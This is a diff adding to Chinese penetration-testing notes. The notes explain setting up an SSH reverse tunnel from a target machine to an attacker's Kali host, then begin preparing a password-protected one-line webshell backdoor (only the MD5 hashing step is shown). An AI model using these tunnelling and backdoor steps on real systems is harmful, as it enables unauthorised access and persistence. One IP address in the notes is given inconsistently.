@@ -1,5 +1,12 @@
 ### 流量转发机制
-iptables
+- iptables
+
+- 申请一台带公网IP的公有云服务器hostb，我们假设ip地址是12.34.56.78，在hosta上执行下面的命令，它会建立一个从hosta到hostb的ssh会话，同时将8080端口映射到hostb的1080端口。`ssh -R 1080:localhost:8080 root@12.34.56.78`, 这样，小王就可以愉快的用http://12.34.66.78:1080访问小明的服务了。
+
+
+从我们的靶机连接kali的ssh，将靶机的80映射到kali的80，源码放到kali。
+
+
 ## 先准备一款只能被自己利用的一句话，如md5加密的马子
 ```
 root@kali:/tmp/2/html# echo -n v5est0r|md5sum  #一定要-n去掉echo输出的换行
